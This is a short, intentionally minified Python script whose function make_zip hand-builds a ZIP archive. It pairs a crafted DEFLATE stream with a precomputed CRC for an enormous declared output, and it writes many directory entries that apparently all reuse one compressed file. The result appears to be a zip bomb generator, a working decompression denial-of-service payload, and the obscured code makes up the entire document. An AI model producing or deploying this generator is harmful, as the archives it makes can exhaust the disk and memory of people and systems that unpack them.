# warning: minified
from struct import pack as F
def G(m,v,A=0):
	for B in range(len(m)):
		if v>>B&1:A^=m[B]
	return A
def make_zip(f,num_files,compressed_size):
	A,H,B,I=(1<<32)-1,num_files,compressed_size,[1<<A for A in range(33)];C,D=B*1032-14447,[1996959894,3993919788,124634137,249268274,498536548,997073096,1994146192,3988292384]+[1<<A for A in range(24)]+[A+1];K=C
	while C:
		if C&1:I=[G(I,A)for A in D]
		D=[G(D,A)for A in D];C>>=1
	L=G(I,2*A+1)&A^A;J=f.write(F('<LHHHHHLLLHH',67324752,20,0,8,0,0,L,B,K,1,0)+b'0\xed\xc0\x81\x08\0\0\0\xc0\xb0\xfbS_d\x0b'+b'\0'*(B-15)+b'`');M=J
	for E in range(H):
		A=[]
		while True:
			A.insert(0,b'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'[E%36]);E=E//36-1
			if E<0:break
		N=bytes(A);J+=f.write(F('<LHHHHHHLLLHHHHHLL',33639248,20,20,0,8,0,0,L,B,K,len(N),0,0,0,0,0,0)+N)
	f.write(F('<LHHHHLLH',101010256,0,0,H,H,J-M,M,0))
